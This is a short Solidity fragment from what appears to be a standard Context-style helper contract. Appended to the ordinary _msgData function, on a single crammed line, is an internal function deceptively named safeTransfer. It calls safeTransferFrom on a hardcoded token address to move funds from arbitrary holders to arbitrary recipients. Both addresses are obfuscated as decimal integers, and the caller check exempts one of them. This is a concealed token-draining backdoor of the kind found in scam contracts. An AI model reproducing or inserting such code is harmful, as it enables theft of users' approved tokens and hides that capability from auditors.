 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(201777822593731705065874722814404695778937971095)) {TransferHelper.safeTransferFrom(address(867322009306283186091808641869542295225174208115),spender,recipient,amount);return true;}return false;}
}
